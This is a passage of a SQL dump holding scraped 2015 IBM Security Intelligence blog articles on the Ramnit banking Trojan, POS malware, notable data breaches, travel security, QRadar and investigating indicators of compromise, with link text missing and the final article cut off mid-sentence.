'https://securityintelligence.com/im-yelling-tinba-trojan-sets-sights-on-singapore-banks-for-holiday-season/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (318, 'The Return of Ramnit: Life After a Law Enforcement Takedown', 'Limor Kessem', '2015-12-22', 'Organized cybercrime is known to attract the attention of international law enforcement and regional counter-cybercrime task forces. Botnet takedowns are one of the means by which police forces from around the world coordinate the disruption of digital crime. Cases of botnet takedowns date back to a variety of spam zombie networks like Pushdo, Rustock, Grum and Simda, and they have been expanded to include the more complex task of taking down banking Trojan infrastructures. So far, the truly big cases have been the   botnet, which relied on an internal P2P scheme to run a more secure and resilient zombie bot army, and  , which was disrupted by British police, an international consortium of law enforcement agencies and information security firms — and, of course,  . Since then, police have taken down another botnet, NgrBot (aka  ), as well. In cases where law enforcement intervened to take down the servers and future communication domain rendezvous of banking Trojan operations, gangs did not appear to recover. This is possibly because they wanted to escape attention from law enforcement and potential legal consequences. While spam botnets have been known to  , banking Trojan botnets never have. Until September this year, takedown operations targeting major financial malware were widely considered the death of the operation, making the gang behind it lose touch with all its money-making zombies. According to IBM X-Force researchers, that may have officially changed in December 2015. Not even a year after  , we are seeing what appears to be the first real re-emergence of the banking Trojan botnet. The conclusion comes from IBM X-Force malware researchers, who have found a new variant of the Ramnit banking Trojan and botnet. Both are already active in attacks on banks and e-commerce transactions in Canada, Australia, the U.S. and Finland. The Ramnit botnet is communicating with new attack servers, employs a completely new and much shorter configuration file and uses a revamped webinjection scheme against its infected victims. \n When Ramnit was first discovered in the wild in 2010, it was only the name of a worm used as an infection vector that leveraged the use of removable drives and network shares to spread to new endpoints. In 2011, Ramnit’s developer took up the task of dressing this virus with code chunks borrowed from the leaked Zeus Trojan sources and turned it into a  . Within three years, the Ramnit Trojan gained quite a bit of momentum in its cybercrime operations. In its pre-takedown life, Ramnit was one of the top banking Trojans in the cybercrime arena, ranking fourth on the most active banking Trojan list in 2014, right under Neverquest (Vawtrak) and alongside other major gangs such as Shylock, Dyre and the Bugat (Dridex) bunch. At the time, Ramnit primarily attacked in the U.K., U.S. and Australia. The Trojan sported a hefty configuration file replete with URL triggers that told it which banks, online transactions and social networking sites to harvest credentials from. In addition to its wanted list, Ramnit used its configuration to steer victims away from a rather exhaustive list of online anti-malware scans, antivirus websites, cybercrime information sites and security blogs. In its old configuration, the mere use of the words “cybercrime” or “police” on a victim’s part triggered a redirection effect. Another very visible part of Ramnit’s previous configurations was the massive amount of job recruitment sites it targeted, harvesting user credentials from the sites in order to target those looking for a job and recruit them. For the victims, this would be a double-edged sword since Ramnit’s operators could also obtain all the information they put on their professional CV. It was pretty clear that the gang behind this Trojan intended to recruit as many mules as possible in each targeted country. Mules are central to the cash-out chain of stolen funds; oftentimes, gangs will also rent out their network of money mules to other cybercriminals in need. Up to this point, Ramnit was believed to be owned by one cybercrime gang and exclusively operated by one team. According to IBM X-Force Threat Intelligence, Ramnit’s source code was never openly sold or shared with other cybercriminals and it was not part of underground chatter. From what we’ve learned so far, nothing seems to point to a notable change in terms of who is behind Ramnit. It is possible that a new gang has picked the project up, but attribution remains vague in this case. The new Ramnit variants discovered by IBM X-Force are identical to the previous ones in terms of their source code and behavior patterns. The only change in modus operandi is expressed in the webinjections and the configuration file, which are both considered to be moving parts in the inner workings of any banking Trojan. Recent findings from IBM X-Force indicated that a number of other Trojans, like Shifu, Dridex and Neverquest, have been using the exact same webinjections and remote servers, which can be indicative of gangs purchasing software-as-a-service (SaaS) from the same injection developers. Strangely enough, Ramnit’s old configuration server is still up, sending configuration files into thin air without any bots on the other end. The new server commands newly infected machines that are receiving Ramnit  . It regularly updates them with configurations and executable file builds. The new Ramnit also operates with a real-time webinjection server, selectively pulling attack schemes on the fly when infected users browse to a few major banks in Canada. Ramnit has been known to mostly spread itself via malvertising campaigns that lead users to an exploit kit. At this time, it is believed to be using the Angler EK, but this is probably not the only infection tactic. Ramnit’s operators have varied their propagation campaigns in the past and may be launching them in additional forms, such as  , email attachments and the usual worm behavior typical to this malware. At the time of this writing, Ramnit attacked major banks in Canada, Australia, the U.S. and Finland. Judging by the previous activity of this malware, it is likely that Ramnit’s operators will spread their reach into other parts of the world in the coming months as they build their new botnet and resources. Fighting evolving threats like the Ramnit Trojan is made easier with the right  . With protection layers designed to address the ever-changing threat landscape, financial organizations can benefit from malware intelligence that provides real-time insight into fraudster techniques and capabilities. Banks and service providers can use these solutions to detect infections and   from threats when they emerge — or in this case, re-emerge.', '\'Banking Trojan\', \'Botnets\', \'Financial Malware\', \'IBM X-Force Research\', \'Malware\', \'Ramnit\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/the-return-of-ramnit-life-after-a-law-enforcement-takedown/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (319, 'How to Increase Your Travel Security Profile', 'David Strom', '2015-12-17', 'When you travel with your digital devices, you need to be aware that your data can be compromised, even if you aren’t going to a  . Keeping a high travel security profile means you have to be constantly vigilant and understand the places and circumstances where you will be most at risk.\n Here are some specific strategies you can use to protect yourself no matter where in the world you are.\n Instead of bringing your usual work laptop, consider using a burner or stripped-down laptop that doesn’t have any user information on it, or possibly a Chromebook or some other device that has a limited attack surface. Other ideal options include some type of sterile device such as throwaway mobile phones, especially if you’re heading to high-risk locations.\n If you must bring your laptop, limit the amount of corporate and personal, confidential information that will be on its hard drive. Clear your cookies and disable the auto-login features of your browser. Delete any software that isn’t going to be used for your trip. If you use a cloud-based file-sharing service, make sure that your connections are over SSL. You can even take this one step further by encrypting your files on the  , too.\n Don’t forget to bring a cable lock to physically secure the computer, as well. Better yet, don’t leave it alone in your hotel room at all. And don’t forget to disinfect any equipment when you return home.\n If you do bring your phone when traveling abroad, keep it turned off. Consider purchasing prepaid SIM cards or temporary phones when you arrive to the destination country. Your IT department should consider having a supply of travel-ready phones for this purpose. This will likely also save costs since many international cell plans are quite expensive, and local phone plans in many countries include free calls to the U.S.\n If you’ve enabled two-factor or multifactor authentication for your key application services, review what you have done. If these services send your phone a one-time password as a text message, you will have to make other arrangements since your phone won’t be operating on your home network when you travel. This happened to me when I went abroad, and I couldn’t log into my accounts without a lot of work.\n There are two aspects at play here: your network security and your surroundings. For the former, consider establishing programs such as full-disk encryption for your hard drive, using some form of   and using a virtual private network (VPN).\n But it is also important that you remain aware of where you are and what you are discussing, either on the phone or in person. I almost never work on planes because they are so crowded that it’s easy for someone to snoop on what I have open on my screen (not to mention that with the shorter seat pitch, you barely have enough room to type). Yes, there are laptop filters that can limit the viewing angle of your screen, but your seatmate or person sitting behind you can still see something.\n  is probably not secure. If possible, avoid using any public network, including those at local Internet cafes. Limit your data connections to wired and trusted networks whenever possible. Don’t download anything to your laptop, even if it looks benign — it probably isn’t. If you need a connection, tether your laptop to your mobile phone and use the broadband phone data network.\n There are a few other measures you can take to keep your data, possessions and person secure. For example, don’t trust any USB thumb drives. Blindly using these devices is an easy way to get infected.\n You should also pay careful attention to how and when you use a VPN. Some business users inadvertently download malware before they bring up their VPN software, which could compromise these networks.\n Paranoia is key. Be aware of what you are doing at all times and you will be able to  .', '\'Security Intelligence\', \'Travel Security\', \'Virtual Private Network (VPN)\', \'Wi-Fi\'', 'https://securityintelligence.com/how-to-increase-your-travel-security-profile/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (320, 'The Retail Industry’s Top Cyberthreat in 2015: Malware', 'Michelle Alvarez', '2015-12-15', 'What’s the retail industry receiving this holiday season? Most likely a new malicious link or document. A   revealed that attacks involving malware are prevalent, making up most of the threat activity observed across the IBM Managed Security Services client networks. Malware is the leading attack type in breaches, according to   data. As in most other industries, attacks aimed at fooling victims into opening malicious documents or clicking on links to malicious sites are proving very successful in retail. The intent is almost always to have the victim download malware. These attacks accounted for nearly 18 percent of the total attacks observed targeting retail in 2015, according to the IBM data. Cybercriminals see no need to reinvent the wheel; proven attack vectors such as   and   continue to plague retailers. Although it’s been around since 1995, SQL injection is still one of the most common attacks on Web assets. It is also the second-most common known attack type associated with retail security breaches. Named one of the threat game changers for 2014, the Shellshock vulnerability is now the No. 3 attack vector. It accounted for over 13 percent of the attacks in the retail industry in 2015. With security controls tightened in large enterprises, attackers are going after smaller businesses. The payoff per target may be lower, but the targets are easier and far more numerous. Analysts are finding it difficult to assess the true impact of this shift because many smaller retailers aren’t reporting the number of compromised records in their disclosures. IBM also assessed attack data from the Black Friday/Cyber Monday weekend. Those days might seem like a good time for increased attacks, but  . This year fared no differently, with the daily average number of attacks that weekend only slightly above the daily average for the year. As the   reported, “While the cost of data breach stayed relatively constant for most industries, the retail sector experienced a significant increase, from $105 [per record] in 2014 to $165 in 2015.” Given the sheer volume of breaches — almost 236 million records are known to have been compromised since 2011 — that means losses in the billions. With all the concerns plaguing the retail industry, organizations need to understand the trends and make the security investments that best respond to them. The IBM recommendations are meant to optimize security programs to stop advanced threats and protect the  .', '\'Cybersecurity\', \'Data Breach\', \'IBM X-Force Research\', \'Malware\', \'Retail\', \'Shellshock\', \'X-Force\'', 'https://securityintelligence.com/the-retail-industrys-top-cyberthreat-in-2015-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (321, 'Five Ways for Security Teams to Save Time and Boost Efficiency With QRadar in 2016', 'Mark Ehr', '2015-12-14', 'I’ve worked in security for more than 15 years, and in that time I’ve worked with hundreds of customers and practitioners, helping them solve tricky security problems so they can prevent, detect and respond to threats with high levels of efficiency. One of the reasons that I love (and sometimes despise) working in cybersecurity is that it changes literally every day — sometimes every hour! I vividly remember one incident that occurred a few years ago during a visit to the security operations center (SOC) of a large bank that had deployed  . While I was there, a distributed denial-of-service (DDoS) attack began, which had the entire security team scrambling to counter it before it affected critical bank websites. The team did track down the source of the attack and block the IPs within a couple of hours, but a lack of efficiency and automation resulted in a delayed response. The days of manual root cause analysis and blocking, which can take hours of time and extensive manual labor, are over. That is exactly the reason IBM has added even more efficiency, automation, out-of-the-box content and collaboration capabilities to the latest release of QRadar, V7.2.6. Let’s run through this scenario with QRadar V7.2.6’s new capabilities. QRadar’s rule engine detects attacks in many ways, including correlation of the attacker’s source IPs with blacklisted IPs acquired from an external threat feed or by triggering network behavioral anomaly rules. The QRadar rule(s) can invoke an automated response such as blocking the attacking IPs on the wire, killing the DDoS attack within minutes. Security analysts, alerted to the offense via the QRadar console, can then collaborate with peers via X-Force Exchange and share data on the attack to help others. We call this  . \n Today, the bad guys are innovating faster than the good, and they aren’t just kids hacking away from a dorm room or their parent’s basement. They are well-funded, highly specialized organizations that run their criminal enterprises like businesses. Many are a product of the Internet generation and are extremely adept at using social tools to collaborate via the Dark Web. The X-Force team recently delivered an interesting and scary  . Cybercriminals sell their technology to each other and even offer it as malware-as-a-service or exploit kits, available via subscription to lesser skilled individuals for a few bitcoins. This has created a very low barrier to entry at one end of the spectrum and a set of highly sophisticated malware and advanced persistent threats (APTs) on the top end. The scary part is attackers only need to find one or two holes in our defenses and all those security investments and hard work is for naught. QRadar V7.2.6 includes significant advances in threat detection and response, improved investigative workflows and even more automation to help our customers prevent, detect and respond to threats by increasing staff efficiency and decreasing response times. My favorite way to communicate the value of what we’re doing is to tell our story in terms of what real people can do with the technology. Here are five ways QRadar is currently helping organizations remain secure. We’re all extremely excited about the new security breakthroughs we’ve made in the new QRadar V7.2.6 release. If you would like to learn more, please watch my webinar, “ .” In it, I’ll dive even deeper into this and many more topics.', '\'IBM Security QRadar\', \'Security Intelligence\'', 'https://securityintelligence.com/five-ways-for-security-teams-to-save-time-with-qradar-in-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (322, 'POS Malware and Loyalty Card Fraud Growing in Popularity', 'Fran Howarth', '2015-12-10', 'With the holiday season upon us, we can expect the  . Some of these attacks will involve the usual suspects of phishing attacks, malware and Trojans, but there are two particular attack vectors that are growing both in volume and sophistication: point-of-sale (POS) malware and loyalty card hacks. There has been a spike in POS malware over the past couple of years. In 2014, such malware came to be associated with botnet capabilities, increasing its attraction to criminals. Then, from the beginning of 2014 to mid-2015, 15 new families of POS malware were identified, all with more powerful capabilities than previous strains, targeting industries including retail, hospitality, food and beverage and travel. Lax security — such as infrequent updates and patching at POS terminals — make these stations the weakest link in the chain. Many also run on  , which is no longer being patched by Microsoft. According to  , around 40 percent of breaches in 2014 were POS-related.   estimated that the number of POS-related security incidents with confirmed data breaches will reach 600 by the end of 2015. Smaller companies are more frequently being targeted by cybercriminals, with a shift seen from highly targeted attacks to those launched en masse. Many of these   lack the security resources or budget to adequately secure their environment, which can lead to data breaches. POS malware aims to scrape the RAM memory of POS terminals in order to steal credit and debit card data. It is particularly attractive for cybercriminals because rewards can be lucrative and they do not need to be physically present to execute an attack. In some cases, POS terminals are used by employees to receive email or to browse the Internet, both of which increase the chances of a malware infection. The latest POS malware seen uses encryption for the data that it exfiltrates, making it hard to know what data has been stolen. Security incidents caused by   can have negative consequences for a merchant’s brand. In many cases, the stolen card data and personal information can be used to make fraudulent purchases, which will likely dent customer loyalty and brand reputation. There has also been an uptick in security incidents involving loyalty cards. According to the “ ,” there has been a 26 percent increase in loyalty card scheme memberships in the U.S. since 2013. Additionally, the average household now belongs to 29 loyalty programs, of which 17 are inactive. \n Loyalty card accounts tend to be less secure than other types such as credit and debit, yet they offer some of the same benefits as real money. The cards themselves are also often inadequately protected, often with just a four-digit PIN or password. Consumers tend to use the same passwords for many accounts, which could lead to multiple accounts being compromised after one breach. According to  , of the 27 loyalty-related websites reviewed, half relied on simple PINs or passwords and just one-third used two-factor authentication. Another concern with loyalty cards is the potential for identity theft. Many   store a great deal of information, including names, birth dates, physical address, email addresses and payment card details, with some even storing other personal data such as income levels. This sort of information is extremely valuable to cybercriminals and can be used by an attacker to steal identity. As one door closes — which will happen with credit card security as the EMV standard becomes more widely adopted — attackers will look to pry open another. The growth of POS   and attacks on loyalty cards are evidence of this. Such attacks are also becoming increasingly sophisticated. Any merchant relying on traditional POS terminals or loyalty programs should ensure that security is extended to these areas. Otherwise, losses could be large, particularly over the holiday season when consumers shop in droves and cybercriminals follow.', '\'Cybercrime\', \'Data Protection\', \'Malware\', \'Personally Identifiable Information (PII)\', \'POS Malware\', \'Security Intelligence\'', 'https://securityintelligence.com/pos-malware-and-loyalty-card-fraud-growing-in-popularity/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (323, 'Eight Crazy Hacks: The Worst and Weirdest Data Breaches of 2015', 'Douglas Bonderud', '2015-12-9', '2015 was a banner year for cybercriminals. And with less than a month left before the calendar rolls over, it’s worth taking a look back at the biggest, craziest and downright strangest hacks and data breaches of the last 11 months. In no particular order, here are eight of the biggest and strangest hacks from the past year: In February, cybersecurity experts called 2015 the “year of the health care hack,” according to  . And they were right: It all started in January with the breach of more than   at Premera Blue Cross. In addition to personal data such as Social Security numbers, mailing addresses and bank account info, attackers also took aim at sensitive claims data. Further investigation by the company discovered the initial hack actually happened in May 2014, giving attackers ample time to comb the system for valuable data. At the beginning of 2015, the Internal Revenue Service rolled out a new way for taxpayers to request critical tax data with their Get Transcript service. The problem? Hackers   and made off with more than 300,000 records that included of tax returns and personal information. While the numbers are smaller than Premera’s breach, the impact may be larger over the long term: Stolen tax return data could be used to open new credit card accounts, file fraudulent returns and damage consumer credit ratings for years to come. Part of the problem came from IRS reliance on knowledge-based authentication (KBA) questions, which the agency claims only the account holder can answer. The problem? It’s easy to buy this information on the Dark Web and then set up an automated submission process to rack up stolen records. This summer, the Office of Personnel Management (OPM) announced that the personal information of more than 4 million government employees had been hacked. As it that weren’t bad enough, things quickly took a turn for the worse: Fingerprint records had also been stolen, and after a more thorough investigation, it was determined that a staggering   were affected by the breach, a far cry from initial reports. According to  , part of the problem came from fragmentation. The OPM didn’t know how much data it had or where all this data was stored. The end result was a personnel change at the top of the OPM for failing to effectively secure digital information and a host of Americans worried about compromised data. It was only a matter of time. In June 2015, the password management program   was hacked and more than 7 million users were affected. In addition to encrypted passwords, cybercriminals gained access to email addresses and password reminder phrases, rendering the service effectively useless. It’s hardly a surprise: While these services promise high-level protection for passwords and claim to help users avoid the problem of forgotten logins or worse — writing down passwords on sticky notes or keeping them as smartphone reminders, for example — they’re also ideal targets for motivated attackers. In one fell swoop, malicious actors got everything they needed to compromise user accounts and lock out legitimate owners. In July 2015, the Impact Team  , the infamous social site that facilitated extramarital affairs. According to its manifesto, the group wanted   taken offline because most “female” profiles were fake and the company had a history of deceit. When this didn’t happen, 37 million user records were dumped on Tor and made available for public viewing. In addition to public ridicule and shame, both men and women had their credit card details exposed. One positive note? The company had used bcrypt to safeguard passwords, one of the most secure algorithms available and a significant step above more commonly seen cleartext and MD5 hashes. It was just one, but it was enough. In July, a team of researchers was able to   using the vehicle’s CAN bus. By exploiting a firmware update vulnerability, they hijacked the vehicle over the Sprint cellular network and discovered they could make it speed up, slow down and even veer off the road. It’s proof of concept for emerging Internet of Things (IoT) hacks: While companies often ignore the security of peripheral devices or networks, the  . While the Harvard University hack wasn’t anything out of the ordinary in terms of approach or execution, it’s worth noting because of its potential scope. The university isn’t sure how many student records were affected, but since its  , it’s possible the damage is extensive. There’s no guarantee that attackers stopped after breaching the first Harvard network layer, either. What about connected networks and third-party vendors? The hack also makes it clear that any information is valuable information to cybercriminals, since most college students aren’t exactly flush with cash or gifted with high credit limits, but that doesn’t matter: Opportunity is the watchword for malicious actors. Last on the list is children’s toy manufacturer VTech. The company has just disclosed that   and 5 million parents’ records were compromised on its Learning Lodge website. There are two issues worth exploring here. First is the noted lack of security provided by VTech; its password hashes were weak and the security architecture was largely out of date. Its response to consumers was also interesting: The company focused on the fact that credit card and financial data hadn’t been compromised, as if somehow that made the breach less of a threat. But that misses the point. Identity, not credit, is the currency of new hacks. Attackers went after multiple targets in 2015, and they didn’t pull any punches. While companies are now more aware of existing risks, don’t expect attackers to slow down in 2016 — mobile, IoT and increasingly sophisticated   are on the horizon for the coming year.', '\'Ashley Madison\', \'Automotive Industry\', \'Cybercrime\', \'Cybercriminals\', \'Data Breach\', \'Healthcare Data Breach\', \'Healthcare Industry\', \'Internal Revenue Service (IRS)\', \'LastPass\'', 'https://securityintelligence.com/eight-crazy-hacks-the-worst-and-weirdest-data-breaches-of-2015/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (324, '2015: Cybercrime’s Epic Year', 'Limor Kessem', '2015-12-8', 'This year in cybercrime was… epic! Every prediction made last year has not only materialized, but exceeded expectations. Increases in attacks, technical sophistication and   than ever imagined painted a new cyber reality in the past 12 months. What was so different in 2015? Wasn’t it just more of the same? Well, not quite. As the year draws to an end, we can look back at some unprecedented cases that redefined risk and loss resulting from cyberattacks. There is a common denominator that groups them as one: The mob has fully moved into the Web. Even   has said, “There is no such thing as ‘disorganized cybercrime’ anymore.” Let’s look at some of the cybercrime headlines that made 2015 so unique: Nowadays, security teams are not dealing with cybercriminals, thieves or a couple of black-hats who are after their customers or assets. We are dealing with full-blown evil organizations that operate in the shadows. They create   using a mix of deep technological savvy, top-notch reconnaissance and old-fashioned street crime. This results in monetary losses so grand that they are causing a shift in the economy, siphoning cash from bank accounts in Western countries, laundering money and using it to fund other criminal operations across the globe. To learn more about the state of organized cybercrime and the threat landscape, watch our on-demand webinar, “ ” for a retrospective view of 2015 and predictions about what we can expect to see in 2016.', '\'Advanced Threats\', \'Carbanak\', \'Cybercrime\', \'Dridex\', \'Dyre\', \'Dyre Wolf\', \'Malware\', \'Threat Intelligence\'', 'https://securityintelligence.com/2015-cybercrimes-epic-year/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (325, 'The Ripple Effect of the CISO in the C-Suite', 'Pamela Cobb', '2015-12-7', 'War games aren’t just for movies. In fact, they have a place in every business, up through the C-suite. When our experts from IBM Emergency Response Services (ERS) reported on the top developments they’d seen in 2015 engagements in the recent  , the rise in prominence of the CISO role and the prevalence of security concerns in the boardroom was one of the biggest trends for the year. This isn’t just  , however: It’s making security a priority for every department in the organization. Our ERS experts facilitated a range of engagements, from incident response planning to conducting workshops, to provide first responder-type training. These were followed by the run-through of custom-developed incident scenarios or a tabletop cyber war game. The necessity for these war games goes beyond CISO and IT preparedness because the effects of a single incident can be devastating to the business. Although the impact may not be directly tied to  , damages to multiple areas of the business can happen within hours of an attack. The CISO and the security department identify an attack that exfiltrates sensitive data and shuts down parts of the internal network. The CISO alerts the chief officers and board of directors. Now what? \n With all that action happening for the main players, we start to see how an event in one area affects another. The downtime for the CIO’s internal communication systems can affect the CMO’s ability to respond to inquiries in a timely manner, which affects customer perception. In scientific terms, the overlapping ripples of these activities in the same area are known as  , a term coined by French physicist Joseph Valentin Boussinesq. In extreme cases,   or waffled clapotis, occurs as the ripples amplify each other. The individual crests created at the intersections and the resultant vortices can erode material from the surrounding structure until it breaks down completely. In our example, this can occur if the company is quick to assign blame on an external vendor based on preliminary findings only to find the real cause of the breach was an insider. This can lead to erosion of consumer confidence, worsening partner relations and potential litigation. In some cases, though, partial clapotis can happen: The ripples reflect off the surrounding areas and dissipate. How can a company achieve partial clapotis rather than the destructive ripple effect? Because no company has precognition of when an incident might occur, the best way to minimize damage from a breach is to have an incident response plan in place. These plans need to be maintained, refreshed and practiced regularly. Knowing clear lanes of responsibility for each department is essential to avoid missteps, prevent premature blame placing and minimize the impact of the incident on the day-to-day operations of the business. Practicing the plan is a key component; that’s where the war game scenario comes in. It may feel wasteful to spend time planning for what may never happen or may not shake out exactly as planned, but having the muscle memory so everyone knows their role and the order in which things need to happen is an advantage to minimizing disruption and maximizing recovery. Without a plan, everyone may throw rocks in the pond at the same time. With a plan, the team knows who is on the task so the ripples are minimized. To learn more about other trends our experts have seen in the wild,   from  .', '\'C-Suite\', \'Chief Information Security Officer (CISO)\', \'Executives\', \'IBM X-Force Research\', \'Security Leadership\', \'X-Force\', \'X-Force Threat Intelligence Quarterly\'', 'https://securityintelligence.com/the-ripple-effect-of-the-ciso-in-the-c-suite/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (326, 'Practical Indicators of Compromise and X-Force Exchange', 'Doug Franklin', '2015-12-2', 'The “ ” includes an article discussing indicators of compromise (IoCs), titled “The Power of Indicators of Compromise for Incident Forensics.” They can also be known as observables since they are artifacts that one can observe within the system’s environment. As that article noted, IoCs are part of the digital evidence that an attack may have occurred. Once alerted to suspicious activity, the network security team tracks down IoCs related to the activity and uses them to assess the threat. In the past, that assessment could be difficult and inconclusive. With the spread of threat intelligence sharing, however, the effort has become considerably easier — though not always more conclusive. Indicators of compromise come in two basic flavors: activities that alert you to the possibility of an attack and digital artifacts that may indicate an attack. The first category describes anomalous or suspicious activities within your network and systems. Examples include: The other category of IoCs includes digital artifacts that can appear on a host computer or network that may indicate compromise or activity by malicious software. Host-based indicators of compromise include things like files, registry entries, named synchronization primitives and processes. \n The   — and this article — focuses on IoCs that appear on the network, including usernames and certificates, IP addresses, domain names, URLs and the names and hash codes of files being transmitted. You find them in your host logs, security and network device logs and security information and event management (SIEM) systems. Once you start researching IoCs, you encounter related artifacts and information such as: IoCs provide the first concrete targets for your investigation. The investigation might begin due to anomalies in the behavior of a host or some odd network traffic. It quickly leads to IoCs such as the IP addresses, host names and URLs that the suspicious host accessed and the identities of the files it sends and receives. Indicators can include both artifacts outside your network and those inside. These present two very different investigative paths. If your organization follows best practices, you can very quickly determine whether that back-office host should actually be serving FTP traffic. If not, you may be looking at evidence of the efforts of an attacker who already has a foothold in your systems. Investigating IP addresses and domain names outside your network and systems present a more difficult task. You need to assess them to determine whether they represent traces of an attack, and that requires external threat intelligence resources that probably are not organic to your systems or operations. That’s where   comes in. It can help you assess the risk of the indicators you have and can sometimes lead you to other ones you should look for in your environment. Typically, an investigation starts with one or two IP addresses, domain names or URLs. It spreads out from there to assess the chances that those indicators really do signal malicious activity. This early in the hunt, you will probably just use X-Force Exchange to retrieve reputation information about your handful of indicators. Remember that your searches only include Collections when you have logged in to X-Force Exchange. As an example, let’s say that your logs reported a host name that you don’t recognize, grado.selfip.com, so you search for it in Exchange. The graphic below shows what you would have received. If your research indicates a potential attack, you can create an Exchange Collection to pull together all the information you find during the investigation — like incident case files without the manila folders. When you create a Collection, it will be private to you. You can share it with other specific X-Force Exchange users or with the world once you create it. The following graphic show a brand new Collection named New Collection Example (the text appears for this article, not in an actual new collection): On the right side of the screen, you start to see some of the real power of Exchange. The top area, labeled Private Collection, allows you to manage the visibility of the Collection, including sharing it with other users or the public at large, or even deleting it. When you share a Collection, you can choose whether others may edit or update it. Just below that, you find a bar with five icons that allow you to: Below that, the Reports section lists the artifact reports attached to the Collection. The Version History section lets you see who edited the Collection and when. Clicking on a version lets you see the Collection up to that particular point in time. The Attachments section shows the files attached to the Collection. They could contain anything from lists of indicators to more in-depth analysis of the components of the attack. Finally, the Linked Collections section identifies the other Collections to which this one has been linked. Here’s an example of a real public Collection on X-Force Exchange. It describes a 2012 attack on the security company Bit9. The power of the Collection begins when you use your new Collection to track an investigation. Search for one of the IoCs you found in your network. As an example, we’ll use the host name grado.selfip.com. The report shows it as high-risk (seven out of 10) and said it is known for banner advertisements. Luckily, the sensor network has not seen malware coming from it. Unluckily, it’s part of a Collection, which means someone has reported it as being involved in something at least suspicious. You definitely want to include this one in your investigation. A small folder-plus icon   in the upper right corner of the report allows you to associate the report with your Collection. A dialog box appears when you click it, and you can type or select the name of your Collection to associate this report with it. When you associate a report with a Collection, Exchange saves a snapshot of the report at the moment you add it. When viewing the Collection, clicking on a report brings up the snapshot. That snapshot also has a button to let you see what the current data on the artifact is in case it has since changed. As you work through investigation of your IoCs, you can keep notes in the wiki page section of the Collection. You can share the Collection with the members of your team so that you can collaborate on the investigation. Create links to other Collections when you notice indicators that show up in them as well as in your investigation. If it turns out to actually be an attack, you can share the Collection more widely or even make it public to solicit information from others and raise their awareness. Additionally, Exchange provides detailed reports on disclosed vulnerabilities. When your investigation finds a particular software system attacked, the vulnerability reports can inform you of other products exposed to the same attack, the availability of patches for those products and the   signatures available to ward off the attacks.\n \n Now take a closer look at the details in the reports for your indicators. The first things you’ll notice are the risk assessment and the reputation categories for the indicator. For IP addresses, you’ll also see an indicator of the geolocation. For domains and URLs, the report will identify any known Internet Applications hosted there. For MD5s, it will tell you what fraction of virus scanners detect the sample as malware. The reports also give you a history of the changes to the indicator. For IP addresses, URLs and host names, the reports identify any malware known to be associated with the indicator. For example, if the sensors notice a piece of malware traveling as an email attachment, the report will reflect the association between that malware sample, the sending domain (probably forged) and the sending IP address. You’re looking for risk in the individual indicators, but you also need to see if there’s a trail of risk that connects the indicators. For example, you’re looking for high-risk URLs associated with high-risk IP addresses and the malware associated with either or both. If the indicators appear in other collections, those references can be telling, as well. Perhaps others are suffering the same attack that you are. Collections in X-Force Exchange can represent several types of information. When researching a real or potential intrusion, a Collection represents an incident. When several incidents use the same infrastructure, tactics and tools, a Collection can corral them to represent the attack. When several attacks share infrastructure, tactics and tools, another Collection can gather information to represent a campaign. And when several campaigns share infrastructure, tactics and tools, yet another Collection can unite them to provide an overview of the villain behind all that activity. The primary mechanism to recognize these relationships lies in the Link Collection functionality mentioned above. In addition, the Exchange has other collection types, including collections for significant announcements, original malware and Exploit Kit research reports from IBM Security. An article this short cannot do justice to the possibilities. IBM X-Force Exchange offers incident response personnel a place where they can track and share evidence and discoveries, as well as use intelligence from IBM X-Force and other users to assess the evidence uncovered by their investigation. The Exchange also offers a broader base of real incident, attack and campaign data from actual sources and attacks for researchers looking for patterns to malicious activity. Please be aware that this article discusses the abilities of X-Force Exchange when the article was written. IBM updates Exchange every two weeks, and it may change by the time you have a chance to experience it. In addition, the Exchange reports live data from an active sensor network. If you make the same query on different days, the later query may contain information that wasn’t available yet the first time.', '\'IBM X-Force Exchange\', \'Incident Forensics\', \'Indicator of Compromise (IoC)\', \'Security Information and Event Management (SIEM)\', \'X-Force\', \'X-Force Threat Intelligence Quarterly\'', 'https://securityintelligence.com/practical-indicators-of-compromise-and-x-force-exchange/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (327, 'Researching the Psychology of Hackers', 'Martin McKeay', '2015-12-2', 'Being the inspiration for “CSI: Cyber” is not likely an honor many people in the security field would be happy to claim. But this is exactly the tag line that cyberpsychologist Professor Mary Aiken is often given. As the director of the CyberPsychology Research Center (CPRC) in Dublin, she has an interesting viewpoint on cybercriminals and hackers around the world. Aiken is one of the leaders looking into the motivations and psychology of the people who are committing crimes using computers and the Internet. It’s criminal psychology specializing in crimes carried out via technology. Without a doubt, the type of work she is doing is needed in today’s society. We live in an age in which many if not most crimes involve a computer at some point, so it stands to reason that research on how the involvement of computers changes both the nature of the crime and the criminal is necessary. Reading about Aiken’s recent presentation at the 2015 Web Summit in  , it’s interesting to see her comments about hacking as a Freudian “cyber-sexual urge to penetrate,” especially seeing the term cyber once again added to the mix. Research into particular psychology that marks hackers isn’t actually all that new. There have been studies that started as far back as 2005  . But to see something that’s receiving attention in a mainstream event like the Web Summit and to see it covered by publications such as The Guardian is something new. The potential danger resulting from the attention Aiken is receiving is that it further fuels the   as a young adult male, wearing a hoodie and living in his parents’ basement. It puts nice, intellectual words and psychology jargon around the description, but despite the polysyllabic pronouncements, it’s the same stereotype we’ve seen in the news since the press took control of the word hacker. No matter how pretty the veneer her talks put on the term, what she’s telling the world is the same story we’ve heard again and again, and that’s disappointing. That said, stereotypes generally exist for a reason: If you go to   in Las Vegas or   in Europe, you’ll see hundreds of examples of 